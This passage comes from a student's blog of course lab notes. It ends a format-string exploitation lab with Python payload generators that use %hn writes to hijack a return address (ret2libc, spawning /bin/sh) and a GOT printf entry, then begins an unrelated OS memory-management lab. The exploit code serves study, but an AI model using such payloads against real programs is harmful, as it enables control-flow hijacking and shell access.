class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_payload</span>(<span class="params">ret_addr, sh_str_addr, exit_addr, system_addr</span>):</span><br><span class="line">    N = <span class="number">200</span></span><br><span class="line"></span><br><span class="line">    addr = ret_addr</span><br><span class="line">    payload = (addr + <span class="number">10</span>).to_bytes(<span class="number">4</span>, byteorder=<span class="string">&#x27;little&#x27;</span>) <span class="comment"># high 2 bytes of /bin/sh string address</span></span><br><span class="line">    payload += (<span class="string">&quot;@@@@&quot;</span>).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line">    payload += (addr + <span class="number">8</span>).to_bytes(<span class="number">4</span>, byteorder=<span class="string">&#x27;little&#x27;</span>) <span class="comment"># low 2 bytes of /bin/sh string address</span></span><br><span class="line">    payload += (<span class="string">&quot;@@@@&quot;</span>).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line">    payload += (addr + <span class="number">6</span>).to_bytes(<span class="number">4</span>, byteorder=<span class="string">&#x27;little&#x27;</span>) <span class="comment"># high 2 bytes of exit address</span></span><br><span class="line">    payload += (<span class="string">&quot;@@@@&quot;</span>).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line">    payload += (addr + <span class="number">4</span>).to_bytes(<span class="number">4</span>, byteorder=<span class="string">&#x27;little&#x27;</span>) <span class="comment"># low 2 bytes of exit address</span></span><br><span class="line">    payload += (<span class="string">&quot;@@@@&quot;</span>).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line">    payload += (addr + <span class="number">2</span>).to_bytes(<span class="number">4</span>, byteorder=<span class="string">&#x27;little&#x27;</span>) <span class="comment"># high 2 bytes of system address</span></span><br><span class="line">    payload += (<span class="string">&quot;@@@@&quot;</span>).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line">    payload += (addr).to_bytes(<span class="number">4</span>, byteorder=<span class="string">&#x27;little&#x27;</span>) <span class="comment"># low 2 bytes of system address</span></span><br><span class="line"></span><br><span class="line">    sh_str_addr = <span class="built_in">int</span>(sh_str_addr, <span class="number">16</span>)</span><br><span class="line">    exit_addr = <span class="built_in">int</span>(exit_addr, <span class="number">16</span>)</span><br><span class="line">    system_addr = <span class="built_in">int</span>(system_addr, <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Construct the format string</span></span><br><span class="line">    offsets = [</span><br><span class="line">        (sh_str_addr &gt;&gt; <span class="number">16</span>) - <span class="built_in">len</span>(payload),</span><br><span class="line">        (sh_str_addr &amp; <span class="number">0xffff</span>) - (sh_str_addr &gt;&gt; <span class="number">16</span>),</span><br><span class="line">        (exit_addr &gt;&gt; <span class="number">16</span>) - (sh_str_addr &amp; <span class="number">0xffff</span>),</span><br><span class="line">        (exit_addr &amp; <span class="number">0xffff</span>) - (exit_addr &gt;&gt; <span class="number">16</span>),</span><br><span class="line">        (system_addr &gt;&gt; <span class="number">16</span>) - (exit_addr &amp; <span class="number">0xffff</span>),</span><br><span class="line">        (system_addr &amp; <span class="number">0xffff</span>) - (system_addr &gt;&gt; <span class="number">16</span>)</span><br><span class="line">    ]</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Adjust offsets if necessary</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(offsets)):</span><br><span class="line">        <span class="keyword">if</span> offsets[i] &lt;= <span class="number">0</span>:</span><br><span class="line">            offsets[i] += <span class="number">0x10000</span></span><br><span class="line"></span><br><span class="line">    s = <span class="string">&quot;%.&quot;</span> + <span class="built_in">str</span>(offsets[<span class="number">0</span>]) + <span class="string">&quot;x&quot;</span> + <span class="string">&quot;%17$hn&quot;</span> + \</span><br><span class="line">        <span class="string">&quot;%.&quot;</span> + <span class="built_in">str</span>(offsets[<span class="number">1</span>]) + <span class="string">&quot;x&quot;</span> + <span class="string">&quot;%19$hn&quot;</span> + \</span><br><span class="line">        <span class="string">&quot;%.&quot;</span> + <span class="built_in">str</span>(offsets[<span class="number">2</span>]) + <span class="string">&quot;x&quot;</span> + <span class="string">&quot;%21$hn&quot;</span> + \</span><br><span class="line">        <span class="string">&quot;%.&quot;</span> + <span class="built_in">str</span>(offsets[<span class="number">3</span>]) + <span class="string">&quot;x&quot;</span> + <span class="string">&quot;%23$hn&quot;</span> + \</span><br><span class="line">        <span class="string">&quot;%.&quot;</span> + <span class="built_in">str</span>(offsets[<span class="number">4</span>]) + <span class="string">&quot;x&quot;</span> + <span class="string">&quot;%25$hn&quot;</span> + \</span><br><span class="line">        <span class="string">&quot;%.&quot;</span> + <span class="built_in">str</span>(offsets[<span class="number">5</span>]) + <span class="string">&quot;x&quot;</span> + <span class="string">&quot;%27$hn&quot;</span> + <span class="string">&quot;\n&quot;</span></span><br><span class="line"></span><br><span class="line">    payload += (s).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line">    payload += <span class="built_in">bytearray</span>(<span class="number">0x90</span> <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(N - <span class="built_in">len</span>(payload)))</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&quot;Generate payload for format string exploit.&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;ret_address&#x27;</span>, <span class="built_in">type</span>=<span class="keyword">lambda</span> x: <span class="built_in">int</span>(x, <span class="number">16</span>), <span class="built_in">help</span>=<span class="string">&quot;Return address in hexadecimal&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;sh_str_address&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&quot;Address of /bin/sh string in hexadecimal&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;exit_address&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&quot;Address of exit function in hexadecimal&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;system_address&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&quot;Address of system function in hexadecimal&quot;</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    payload = generate_payload(args.ret_address, args.sh_str_address, args.exit_address, args.system_address)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Write the content to input2</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;input2&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sh exploit_prog2_2.sh bfffeccc b7ec582b b7d989d0 b7da4da0</span><br></pre></td></tr></table></figure></li></ol><h2 id="prog2-GOT-table-hijacking-call-win-function"><a href="#prog2-GOT-table-hijacking-call-win-function" class="headerlink" title="prog2 GOT table hijacking, call win function"></a>prog2 GOT table hijacking, call win function</h2><p>Attack approach: Use printf function to modify the offset printf in the GOT table to the win function address, making the last printf in the fmtstf function execute the win function.</p><ol><li><p>View GOT table, find printf function address as 0x0804a00c</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objdump -R prog2</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240614171850643.png" alt="image-20240614171850643"></p></li><li><p>View PLT table, see win function address as 0x0804850b</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">objdump -d prog2 | grep -A 18 win</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240614171908045.png" alt="image-20240614171908045"></p></li><li><p>Start attack</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta prompt_"># </span><span class="language-bash">Enable address randomization</span></span><br><span class="line">sudo sysctl -w kernel.randomize_va_space=2</span><br></pre></td></tr></table></figure><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3</span></span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">generate_payload</span>(<span class="params">win_addr, printf_addr</span>):</span><br><span class="line"></span><br><span class="line">    addr = printf_addr</span><br><span class="line">    payload = (addr + <span class="number">2</span>).to_bytes(<span class="number">4</span>, byteorder=<span class="string">&#x27;little&#x27;</span>)  <span class="comment"># high 2 bytes of win function address</span></span><br><span class="line">    payload += (<span class="string">&quot;@@@@&quot;</span>).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line">    payload += (addr).to_bytes(<span class="number">4</span>, byteorder=<span class="string">&#x27;little&#x27;</span>)  <span class="comment"># low 2 bytes of win function address</span></span><br><span class="line">    </span><br><span class="line">    win_addr = <span class="built_in">int</span>(win_addr, <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Calculate the offset values for the format string</span></span><br><span class="line">    offset1 = (win_addr &gt;&gt; <span class="number">16</span>) - <span class="number">3</span>*<span class="number">4</span> - <span class="number">8</span>*<span class="number">15</span></span><br><span class="line">    offset2 = (win_addr &amp; <span class="number">0xffff</span>) - (win_addr &gt;&gt; <span class="number">16</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> offset2 &lt; <span class="number">0</span>:</span><br><span class="line">        offset2 += <span class="number">0x10000</span></span><br><span class="line"></span><br><span class="line">    s = <span class="string">&quot;%.8x&quot;</span> * <span class="number">15</span> + \</span><br><span class="line">        <span class="string">&quot;%.&quot;</span> + <span class="built_in">str</span>(offset1) + <span class="string">&quot;x&quot;</span> + <span class="string">&quot;%hn&quot;</span> + \</span><br><span class="line">        <span class="string">&quot;%.&quot;</span> + <span class="built_in">str</span>(offset2) + <span class="string">&quot;x&quot;</span> + <span class="string">&quot;%hn&quot;</span> + <span class="string">&quot;\n&quot;</span></span><br><span class="line"></span><br><span class="line">    payload += (s).encode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> payload</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">main</span>():</span><br><span class="line">    parser = argparse.ArgumentParser(description=<span class="string">&quot;Generate payload for format string exploit.&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;win_address&#x27;</span>, <span class="built_in">type</span>=<span class="built_in">str</span>, <span class="built_in">help</span>=<span class="string">&quot;Address of win function in hexadecimal&quot;</span>)</span><br><span class="line">    parser.add_argument(<span class="string">&#x27;printf_address&#x27;</span>, <span class="built_in">type</span>=<span class="keyword">lambda</span> x: <span class="built_in">int</span>(x, <span class="number">16</span>), <span class="built_in">help</span>=<span class="string">&quot;Address of printf function in hexadecimal&quot;</span>)</span><br><span class="line">    args = parser.parse_args()</span><br><span class="line"></span><br><span class="line">    payload = generate_payload(args.win_address, args.printf_address)</span><br><span class="line"></span><br><span class="line">    <span class="comment"># Write the content to input2</span></span><br><span class="line">    <span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&quot;input2&quot;</span>, <span class="string">&quot;wb&quot;</span>) <span class="keyword">as</span> f:</span><br><span class="line">        f.write(payload)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    main()</span><br></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sh exploit_prog2_3.sh 0804850b 0804a00c</span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240614172148953.png" alt="image-20240614172148953"></p><p><img src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/image-20240614173640106.png" alt="image-20240614173640106"></p></li></ol>]]></content>
      
      
      <categories>
          
          <category> CS Study Notes </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Study Notes </tag>
            
            <tag> Course Experiments </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>HUST Operating System Lab3: Memory Management</title>
      <link href="/2023/12/05/HUST%20Operating%20System%20Lab3:%20Memory%20Management/"/>
      <url>/2023/12/05/HUST%20Operating%20System%20Lab3:%20Memory%20Management/</url>
      
        <content type="html"><![CDATA[<h1 id="Operating-System-Lab3-Memory-Management"><a href="#Operating-System-Lab3-Memory-Management" class="headerlink" title="Operating System Lab3: Memory Management"></a>Operating System Lab3: Memory Management</h1><h2 id="Experiment-Objectives"><a href="#Experiment-Objectives" class="headerlink" title="Experiment Objectives"></a>Experiment Objectives</h2><ol><li><p>Understand page replacement algorithm principles and write programs to demonstrate page replacement algorithms.</p></li><li><p>Verify the mechanism of Linux virtual address to physical address conversion</p></li><li><p>Understand and verify the principle of program execution locality.</p></li><li><p>Understand and verify the page fault handling process.</p></li></ol><h2 id="Experiment-Content"><a href="#Experiment-Content" class="headerlink" title="Experiment Content"></a>Experiment Content</h2><ol><li><p>Write a 2D array traversal program in Win&#x2F;Linux to understand the principle of locality.</p></li><li><p>Simulate and implement OPT, FIFO, or LRU page replacement algorithms in Windows&#x2F;Linux.</p></li><li><p>Study and modify Linux kernel’s page fault handling function do_no_page (new version should be handle_mm_fault) or page frame allocation function get_free_page, and use printk to print debug information. Note: Kernel compilation is required. <strong>Recommended: Ubuntu Kylin or Kylin system</strong>.</p></li><li><p>Use &#x2F;proc&#x2F;pid&#x2F;pagemap technology in Linux to calculate physical addresses corresponding to virtual addresses of variables or functions. <strong>Recommended: Ubuntu Kylin or Kylin system</strong>.</p></li></ol><h2 id="Task-1-Write-a-2D-Array-Traversal-Program-to-Understand-the-Principle-of-Program-Locality"><a href="#Task-1-Write-a-2D-Array-Traversal-Program-to-Understand-the-Principle-of-Program-Locality" class="headerlink" title="Task 1: Write a 2D Array Traversal Program to Understand the Principle of Program Locality"></a>Task 1: Write a 2D Array Traversal Program to Understand the Principle of Program Locality</h2><h3 id="Task-Requirements"><a href="#Task-Requirements" class="headerlink" title="Task Requirements"></a>Task Requirements</h3><ol><li><p>Make the array as large as possible, and try changing the array size and the order of inner and outer loops. For example, change from [2048] X [2048] to [10240] x [20480], and observe their traversal efficiency.</p></li><li><p>Observe their page fault counts in Task Manager or using the &#x2F;proc file system.</p></li></ol><h3 id="Code-Implementation"><a href="#Code-Implementation" class="headerlink" title="Code Implementation"></a>Code Implementation</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iostream&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/time.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/resource.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;vector&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;iomanip&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> std;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Row-major traversal</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">traverseRowMajor</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; &amp;arr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; arr.<span class="built_in">size</span>(); i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">size_t</span> j = <span class="number">0</span>; j &lt; arr[i].<span class="built_in">size</span>(); j++)</span><br><span class="line">        &#123;</span><br><span class="line">            sum += arr[i][j];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// Column-major traversal</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">traverseColumnMajor</span><span class="params">(vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; &amp;arr)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> sum = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> j = <span class="number">0</span>; j &lt; arr[<span class="number">0</span>].<span class="built_in">size</span>(); j++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; arr.<span class="built_in">size</span>(); i++)</span><br><span class="line">        &#123;</span><br><span class="line">            sum += arr[i][j];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="type">int</span> rows, cols;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;Enter the number of rows and columns of the matrix (format: x y): &quot;</span>;</span><br><span class="line">    cin &gt;&gt; rows &gt;&gt; cols;</span><br><span class="line"></span><br><span class="line">    vector&lt;vector&lt;<span class="type">int</span>&gt;&gt; <span class="built_in">arr</span>(rows, <span class="built_in">vector</span>&lt;<span class="type">int</span>&gt;(cols, <span class="number">1</span>));</span><br><span class="line"></span><br><span class="line">    rusage usage;</span><br><span class="line">    timeval start, end;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> choice;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;Choose traversal method (r: row-major, c: column-major): &quot;</span>;</span><br><span class="line">    </span><br><span class="line">    cin &gt;&gt; choice;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get process resource usage before starting</span></span><br><span class="line">    <span class="built_in">getrusage</span>(RUSAGE_SELF, &amp;usage);</span><br><span class="line">    start = usage.ru_utime;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (choice == <span class="string">&#x27;r&#x27;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">traverseRowMajor</span>(arr);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> (choice == <span class="string">&#x27;c&#x27;</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="built_in">traverseColumnMajor</span>(arr);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Get process resource usage after completion</span></span><br><span class="line">    <span class="built_in">getrusage</span>(RUSAGE_SELF, &amp;usage);</span><br><span class="line">    end = usage.ru_utime;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Output time in milliseconds</span></span><br><span class="line">    <span class="type">double</span> time_taken = (end.tv_sec - start.tv_sec) * <span class="number">1000</span> + (end.tv_usec - start.tv_usec) / <span class="number">1000.0</span>;</span><br><span class="line"></span><br><span class="line">    cout &lt;&lt; fixed &lt;&lt; <span class="built_in">setprecision</span>(<span class="number">3</span>) &lt;&lt; <span class="string">&quot;Time consumed: &quot;</span> &lt;&lt; time_taken &lt;&lt; <span class="string">&quot; milliseconds\n&quot;</span>;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;Page faults: &quot;</span> &lt;&lt; usage.ru_minflt &lt;&lt; <span class="string">&quot; times\n&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="32-bit-Program-Compilation"><a href="#32-bit-Program-Compilation" class="headerlink" title="32-bit Program Compilation"></a>32-bit Program Compilation</h3><p>If you directly add -m32 for compilation, it will report an error:</p><p><img src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/3-1-32bit_error.png" alt="32bit compilation error"></p><p>Because 32-bit libraries are missing, you need to install 32-bit libraries:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sudo</span> dpkg --add-architecture i386              <span class="comment"># Add 32-bit architecture</span></span><br><span class="line"><span class="built_in">sudo</span> apt-get install gcc-multilib g++-multilib <span class="comment"># Install 32-bit libraries</span></span><br></pre></td></tr></table></figure><h3 id="32-bit-and-64-bit-Program-Execution-Results"><a href="#32-bit-and-64-bit-Program-Execution-Results" class="headerlink" title="32-bit and 64-bit Program Execution Results"></a>32-bit and 64-bit Program Execution Results</h3><p>Using g++ to compile 32-bit and 64-bit executable files test_32 and test_64 respectively, the execution results are as follows:</p><p><img src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/3-1-result1.png" alt="64-bit execution result"></p><p><img src="https://raw.githubusercontent.com/hustlixiang21/blog-image/main/3-1-result2.png" alt="32-bit execution result"></p><h3 id="Observation-and-Analysis-of-Phenomena"><a href="#Observation-and-Analysis-of-Phenomena" class="headerlink" title="Observation and Analysis of Phenomena"></a>Observation and Analysis of Phenomena</h3><ol><li><p>Execution time:</p><ol><li>In smaller matrices (2048x2048), 64-bit programs have slightly less execution time than 32-bit programs.</li><li>In larger matrices (10240x20480), 64-bit programs are significantly faster than 32-bit programs in row-major traversal, but in column-major traversal, the time difference between the two is not significant.</li></ol></li><li><p>Page faults:</p><ol><li>For both programs (32-bit and 64-bit), under the same matrix size and traversal method, the number of page faults is almost identical.</li></ol></li></ol><p>Execution time differences:</p><p>64-bit programs can typically handle large datasets more efficiently because they can utilize larger address spaces and generally more efficient data processing capabilities (e.g., larger registers and better memory management). This explains why 64-bit programs are faster than 32-bit programs in row-major traversal when processing larger matrices.<br>For column-major traversal, due to memory access patterns causing frequent cache misses, this may somewhat offset the advantages of 64-bit architecture, resulting in similar performance between the two in large matrix column-major traversal.</p><p>Page fault similarity:</p><p>The number of page faults mainly depends on the program’s memory access patterns and the operating system’s page management strategy, rather than the program’s bit width. Therefore, even for 32-bit and 64-bit programs, if they perform the same memory access operations, the number of page faults may be very similar. It seems more dependent on memory access patterns and the operating system’s memory management.</p><p>But I actually have a question: intuitively, column-major traversal should produce more page faults than row-major traversal, because in column-major traversal, each access address is continuous, while in row-major traversal, each access address is discontinuous. But in reality, the number of page faults for both is almost the same.</p><p><strong>GPT’s answer:</strong></p><ul><li><p>Memory paging and access patterns:</p><ul><li>In modern computer systems, physical memory is managed in pages. If a matrix’s rows or columns span multiple memory pages, then both row-major and column-major traversal may cause page faults.</li><li>In row-major traversal, if each row of the matrix spans multiple pages, then even if access is continuous, page faults may occur when accessing new rows.</li><li>In column-major traversal, although each jump to a new column may touch new memory pages, if the column data is small and can be completely contained within a single or few memory pages, the occurrence of page faults may not be much more than in row-major traversal.</li></ul></li><li><p>Cache and prefetch strategies:</p><ul><li>Modern processors have advanced cache and prefetch mechanisms. These mechanisms may somewhat reduce the expected number of page faults in column-major traversal.</li><li>Processors may be able to predict upcoming memory access patterns and preload data from main memory to cache, so even column-major access may not immediately cause page faults.</li></ul></li><li><p>Operating system memory management:</p><ul><li>The operating system may adopt some strategies in memory management, such as lazy allocation, which may cause the actual number of page faults to differ from expectations.</li><li>The operating system may maintain a certain number of free page pools, so in early memory access, the occurrence rate of page faults may be lower.</li></ul></li><li><p>Physical memory layout of matrices:</p><ul><li>The actual layout of matrices in physical memory may also affect the occurrence of page faults. For example, if some parts of the matrix have already been loaded into memory for other reasons, this may reduce page faults in specific traversal methods.</li></ul></li><li><p>Overall system memory load:</p><ul><li>If other processes running on the system consume a lot of memory, this may affect the page fault behavior of your program. The overall memory load and availability of the system may cause different page fault behaviors for the same operation at different time points.</li></ul></li></ul><h2 id="Task-2-Simulate-and-Implement-OPT-FIFO-or-LRU-Page-Replacement-Algorithms"><a href="#Task-2-Simulate-and-Implement-OPT-FIFO-or-LRU-Page-Replacement-Algorithms" class="headerlink" title="Task 2: Simulate and Implement OPT, FIFO, or LRU Page Replacement Algorithms"></a>Task 2: Simulate and Implement OPT, FIFO, or LRU Page Replacement Algorithms</h2><h3 id="Task-Requirements-1"><a href="#Task-Requirements-1" class="headerlink" title="Task Requirements"></a>Task Requirements</h3><ol><li><p>Use array traversal operations to simulate program instruction execution;</p></li><li><p>Use one large array A (e.g., 2400 elements) to simulate a process, with random numbers in the array. When each element is accessed, use printf to print it out, simulating instruction execution. The size of array A must be an integer multiple of the set page size (e.g., 10 elements or 16 elements, etc.).</p></li><li><p>Use 3-8 small arrays (e.g., array B, array C, array D, etc.) to simulate allocated page frames. The size of small arrays equals the page size (e.g., 10 instruction sizes, i.e., 10 elements). The small arrays contain copies of the corresponding page content from the large array (build a page table separately to describe the relationship between pages of the large array and small array indices).</p></li><li><p>Access array A in different orders, which can be: sequential, jump, branch, loop, or random. Build access orders yourself. Different orders also reflect program locality to some extent.</p></li><li><p>The access order of the large array can be defined using the rand() function to simulate instruction access sequences corresponding to the access order of large array A. Then transform the instruction sequence into corresponding page address streams and count “page faults” for different page replacement algorithms. Page faults occur when the corresponding “page” is not loaded into small arrays (e.g., array B, array C, array D, etc.).</p></li><li><p>In the experiment, page size, number of page frames, access order, and replacement algorithm should all be adjustable.</p></li></ol><h3 id="Code-Implementation-1"><a href="#Code-Implementation-1" class="headerlink" title="Code Implementation"></a>Code Implementation</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span 